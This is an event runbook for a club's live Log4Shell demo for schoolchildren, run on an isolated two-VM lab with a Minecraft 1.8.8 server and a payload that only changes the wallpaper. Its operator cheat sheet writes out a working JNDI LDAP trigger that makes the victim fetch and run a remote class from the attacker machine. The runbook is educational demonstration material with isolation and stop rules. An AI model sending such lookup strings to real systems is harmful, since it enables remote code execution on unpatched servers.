# Event Runbook — EHAX Open House (OAT)

**Venue:** Open Air Theatre, DTU — daylight, no projector, laptops only
**Audience:** school kids, 4–6 per batch, rotating
**Station:** one victim laptop (desktop visible) + one attacker laptop (terminal)
**Target:** 4–6 minutes per batch, including reset

---

## 1. Roles

| Role | Person | Job |
|---|---|---|
| Presenter | 1 per station | Talks, points, hands off to kid, disclaimer |
| Operator | 1 per station | Runs attacker prompt, watches logs, calls reset |
| Reset/runner | shared across stations | Restores snapshot / wallpaper between batches, queues next group |

If you are short on people: presenter also operates; a runner handles reset for
2–3 stations.

---

## 2. Station layout

- Victim laptop: lid open, screen facing kids, brightness max, desktop visible.
  Minecraft server terminal **minimised**.
- Attacker laptop: terminal visible only to presenter/operator, angled away from
  the audience.
- Power: both laptops plugged in. Disable sleep and screen lock.
- Shade: OAT daylight is the enemy. Put the victim screen in shade, or use a
  black/dark wallpaper before the reveal so the green reveal pops.
- No projector: kids gather close. Keep the victim screen at eye height.
- Optional: a phone on a stand recording the victim screen for the backup clip.
- Spares: one pre-imaged victim VM/laptop and one attacker VM/laptop. Swapping a
  laptop mid-batch is faster than reinstalling Java 8 or Minecraft.

---

## 3. T–1 day checklist

### Both VMs

- [ ] Host-only/private network, no NAT, no internet uplink.
- [ ] Attacker `10.10.10.10`, victim `10.10.10.20`, static.
- [ ] `ping` both ways works.
- [ ] Ports 1389, 8000 (attacker) and 25565 (victim) reachable.
- [ ] VM snapshots taken with the clean normal wallpaper.

### Victim

- [ ] Java 8 installed (`java -version` → 1.8).
- [ ] `server.jar` (Minecraft 1.8.8) present.
- [ ] `./start-server.sh` reaches `Done (…)`.
- [ ] Server terminal minimised; desktop visible.
- [ ] GNOME screen lock/blank disabled.
- [ ] `./capture-wallpaper.sh` run once (or snapshot).
- [ ] One dry run (`EHAX_PAYLOAD_DRY_RUN=1`) and one real wallpaper run.

### Attacker

- [ ] `./build-payload.sh` already run (no internet needed at event).
- [ ] `./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20 --no-chat` starts
      both servers.
- [ ] `curl -I http://10.10.10.10:8000/WallpaperPayload.class` → 200.
- [ ] Chat sender works: send `hello`; victim log shows it.
- [ ] Trigger works end-to-end; wallpaper changes.
- [ ] Backup 20-second video saved offline.

---

## 4. T–20 minutes

1. Power both laptops, connect host-only network, confirm IPs.
2. Start victim server; minimise terminal; confirm normal wallpaper.
3. Start attacker demo servers; confirm banner + trigger.
4. Send one `hello`; confirm it appears in victim `server.log`.
5. Do **not** send the trigger yet. Save it for the kids.
6. Queue the first group; put phones away; presenter reads the card once.

---

## 5. Per-batch flow (5 minutes)

| Time | Action |
|---|---|
| 0:00 | Presenter intro (25 s): who EHAX is, one message → full control |
| 0:25 | Setup (25 s): this is a Minecraft server; chat is logged; old log4j bug |
| 0:50 | Hand off (15 s): kid presses Enter / types the pre-copied trigger |
| 0:55 | Trigger sent; **pause 3–5 s**; don't fill the silence |
| 1:00 | Reveal: “Dekho screen pe!” — wallpaper changes |
| 1:10 | Explain (35 s): log → lookup → class download → run; wallpaper is harmless |
| 1:45 | Why it matters (20 s): updates, patched bug, legal disclaimer |
| 2:05 | Q&A / close (20–60 s) |
| 3:00 | Reset for next batch (victim snapshot or reset script) |

The actual demo is under 10 seconds. Most of the slot is explanation and
questions. Don't rush the pause.

---

## 6. Operator commands (cheat sheet)

**Start attacker (once):**

```bash
cd attacker
./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20
```

**Send a normal hello (test):**

```bash
python3 attacker/chat-send.py --host 10.10.10.20 --port 25565 --message 'hello'
```

**Send the trigger directly:**

```bash
python3 attacker/chat-send.py --host 10.10.10.20 --port 25565 \
  --message '${jndi:ldap://10.10.10.10:1389/a}'
```

**Watch logs:**

```bash
tail -f attacker/logs/ldap.log
tail -f attacker/logs/http.log
tail -f victim/server.log
```

**Proof the payload ran (victim):**

```bash
cat /tmp/ehax-payload-proof.txt
cat /tmp/ehax-payload.log
```

**Reset victim wallpaper (GNOME):**

```bash
cd victim
./reset-wallpaper.sh
```

---

## 7. If the reveal does not happen

Stay in character; do not debug silently for 30 seconds.

1. Presenter: “Ek second, server ko dobara bhejte hain.” Keep talking about the
   logging step.
2. Operator, under the table:
   - Is the victim desktop visible and unlocked?
   - Is the server still running (`Done` in the terminal)?
   - Does `cat /tmp/ehax-payload-proof.txt` show a line?
   - Does `attacker/logs/ldap.log` show `Send LDAP reference result`?
3. If no LDAP log: the server never processed the trigger. Check the chat was
   sent to the right IP/port, server is online-mode=false, and the message is
   under 100 chars.
4. If LDAP log but no proof: the class was requested but not executed. Check the
   victim is Java 8 with the trust flag, and `EHAX_LAB=1`.
5. If proof but no wallpaper: desktop-session issue. Use the backup video and
   continue; fix between batches.
6. Do not restart the whole demo in front of the kids unless the next group is
   already waiting. Use the backup clip and move on.

---

## 8. Reset between batches

**Preferred: VM snapshot restore.**

- Snapshot taken with clean wallpaper and server ready.
- Restore takes 10–30 s depending on hypervisor.
- Start server if the snapshot was taken powered off; minimise terminal.

**Fallback: reset script (GNOME).**

```bash
cd victim
./reset-wallpaper.sh
# server keeps running; no restart needed
```

- Deletes `/tmp/ehax-payload-last-run` so the next batch can trigger again.
- Restores the original wallpaper URI.
- Keeps the server world and logs; fine for a day.

**Windows fallback:** set the wallpaper back manually in Settings, or restore
the snapshot. The payload proof is in `%TEMP%`.

---

## 9. Throughput plan

One station can handle a batch in ~4–5 minutes including reset. With 4–6 kids
per batch, that is roughly 50–70 kids/hour/station. Add one station per 50–70
kids/hour. If queues build, use the 90-second short script and skip Q&A, but
never skip the legal disclaimer.

---

## 10. End of day

- Shut down both VMs; do not connect them to the internet while the lab flag is
  set and the vulnerable server is installed.
- Delete/restore snapshots to a clean state.
- Collect the backup recordings and station cards.
- If photos were taken, confirm consent.
- File a one-line note: what worked, what failed, which desktop environment.

---

## 11. Emergency stop

Stop the demo and shut down the VMs if:

- the network is not isolated (internet/NAT/bridged),
- the payload hits a real machine or public IP,
- someone asks to run it on their own laptop/phone,
- the victim is not a disposable VM,
- you see unexpected file access, shell activity, or outbound traffic outside
  the two lab IPs.

The payload is designed not to do those things, but the stop rule wins over the
demo.
